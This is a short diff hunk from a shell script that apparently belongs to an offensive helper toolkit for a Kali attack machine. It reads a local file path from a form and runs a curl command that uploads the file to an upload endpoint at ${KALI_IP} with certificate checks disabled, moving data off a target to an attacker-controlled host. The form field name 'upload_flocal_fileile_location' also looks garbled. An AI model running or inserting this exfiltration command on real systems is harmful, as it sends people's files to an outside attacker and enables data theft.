@@ -12,5 +12,5 @@ generate_form "${LOCAL_FILE_LOCATION_FIELD}"
 
 LOCAL_FILE_LOCATION=${form_data["upload_flocal_fileile_location"]}
 
-paste_command "curl -X POST https://${KALI_IP}/upload -F 'files=@${LOCAL_FILE_LOCATION}' --insecure"
-xdotool key Return
+execute_command "curl -X POST https://${KALI_IP}/upload -F 'files=@${LOCAL_FILE_LOCATION}' --insecure"
+create_new_line
